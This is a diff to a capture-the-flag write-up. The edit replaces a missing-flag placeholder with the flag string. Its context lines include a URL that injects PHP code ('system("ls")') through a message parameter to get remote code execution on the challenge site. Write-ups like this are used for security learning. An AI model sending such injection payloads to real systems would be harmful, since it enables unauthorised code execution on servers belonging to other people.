@@ -19,8 +19,8 @@ So, we can doing RCE (Remote Code Execution) by submitting PHP syntax like this
 ```
 https://music-mhsctf.0xmmalik.repl.co/send.php?message=<?php system("ls"); ?>
 ```
-And we will got the flag by checking the index file
+And we will got the flag by checking someone's file :D
 
 ```
-NO FLAG BECAUSE THE WEBSITE IS DOWN
+valentine{n3ver_g0nn4_give_y0u_up}
 ```
